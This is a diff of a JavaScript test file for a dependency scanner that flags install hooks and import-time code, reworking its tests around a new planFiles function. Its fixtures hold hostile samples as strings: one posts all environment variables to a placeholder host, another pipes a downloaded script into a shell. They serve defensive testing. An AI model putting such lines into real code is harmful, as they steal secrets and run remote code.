@@ -1,6 +1,9 @@
-// --deps: what a dependency runs (src/deps.js, twin of core.dependency_checks;
-// python/tests/scanner/test_review_dependency_checks.py has the same cases,
-// and tests/architecture/test_js_parity.py compares the two CLIs on them).
+// --deps: what a dependency runs (the engine's decisions since BR-7 step 3e:
+// deps.rs, whose unit tests hold the paths a hook's target joins to and the
+// entry points a package.json names; src/deps.js reads the tree for it, as
+// core does; python/tests/scanner/test_review_dependency_checks.py has the
+// same cases, and tests/architecture/test_js_parity.py compares the two CLIs
+// on them).
 // Each install hook of a dependency's manifest is followed to the files it
 // runs and escalates to CRITICAL when one fails the install-script test; a
 // dependency's other JavaScript and Python files get the import-time test
@@ -12,7 +15,7 @@ import { mkdtempSync, mkdirSync, writeFileSync, readFileSync, rmSync, symlinkSyn
 import { tmpdir } from "node:os";
 import { join, dirname } from "node:path";
 import { run } from "../src/index.js";
-import { treeJoin, npmEntries, webAssets } from "../src/deps.js";
+import { planFiles } from "../src/deps.js";
 
 const EXFIL = "const h = require('https');\n" +
   "h.request({host: 'collector.invalid', method: 'POST'}).end(JSON.stringify(process.env));\n";
@@ -139,17 +142,6 @@ test("--deps: hooks escalate on what they run; import-time code; what cannot be 
   }
 });
 
-test("treeJoin: inside the scan root only", () => {
-  const cases = [
-    [["node_modules/a", "x.js"], "node_modules/a/x.js"], [["node_modules/a", "./b/../x.js"], "node_modules/a/x.js"],
-    [["node_modules/a", "../../y.js"], "y.js"], [["node_modules/a", "../../../y.js"], null],
-    [["node_modules/a", "/usr/y.js"], null], [["node_modules/a", "C:/y.js"], null],
-    [["node_modules/a", "lib\\z.js"], "node_modules/a/lib/z.js"], [["", "x.js"], "x.js"], [["", ".."], null],
-    [["a", "."], "a"], [["a", ".."], null], [["a", "b//c/"], "a/b/c"],
-  ];
-  for (const [[base, target], want] of cases) assert.equal(treeJoin(base, target), want, `${base} + ${target}`);
-});
-
 // (the detection round) a web app's static assets run in a browser: left out unless an entry point
 // reaches them (deps.js webAssets; the Python test has the same tree)
 const WEB = "require('child_process').execSync('curl -s https://files.invalid/x | sh');\n";
@@ -191,10 +183,6 @@ test("--deps: a web app's static assets no entry point reaches are not code that
   } finally {
     rmSync(root, { recursive: true, force: true });
   }
-  assert.deepEqual(npmEntries({ main: "a.js", module: "b.mjs", bin: { c: "c.js", d: 1 },
-    exports: { ".": { import: "./e.mjs", require: ["./f.js", "./g.js"] }, "./*": "./h/*.js" } }),
-  ["a.js", "b.mjs", "c.js", "./e.mjs", "./f.js", "./g.js"]);
-  assert.deepEqual(npmEntries({ bin: "x.js", exports: "./y.js" }), ["x.js", "./y.js"]);
 });
 
 test("--deps: padding hides no file from the walk (BR-5)", () => {
@@ -208,12 +196,18 @@ test("--deps: padding hides no file from the walk (BR-5)", () => {
   const manifest = {
     path: "node_modules/w/package.json", content: JSON.stringify({ name: "w", version: "1.0.0", main: "lib/f0.js" }),
   };
-  const sources = new Map(files.map((f) => [f.path, f]));
-  const manifests = new Map([[manifest.path, manifest]]);
-  const tree = { sources, manifests, resolve: (p) => (sources.has(p) ? p : null) };
-  assert.deepEqual([...webAssets(tree, files)], []);
-  const exports = Object.fromEntries(Array.from({ length: 6000 }, (_, i) => [`./p${i}`, `./p${i}.js`]));
-  assert.equal(npmEntries({ exports }).length, 6000);
+  const root = mkdtempSync(join(tmpdir(), "lz-deps-pad-"));
+  try {
+    assert.deepEqual(planFiles(root, files, new Set(), [manifest]).assets, []);
+    // an entry point past 6,000 exports
+    const exports = Object.fromEntries(Array.from({ length: 6000 }, (_, i) => [`./p${i}`, `./p${i}.js`]));
+    exports["./run"] = "./static/run.js";
+    const run = [{ path: "node_modules/v/static/run.js", content: WEB, lang: "js", dep: true }];
+    const v = { path: "node_modules/v/package.json", content: JSON.stringify({ name: "v", version: "1.0.0", exports }) };
+    assert.deepEqual(planFiles(root, run, new Set(), [v]).assets, []);
+  } finally {
+    rmSync(root, { recursive: true, force: true });
+  }
 });
 
 test("--deps: each installed package's names for its tests (D-12b, D-9c)", () => {
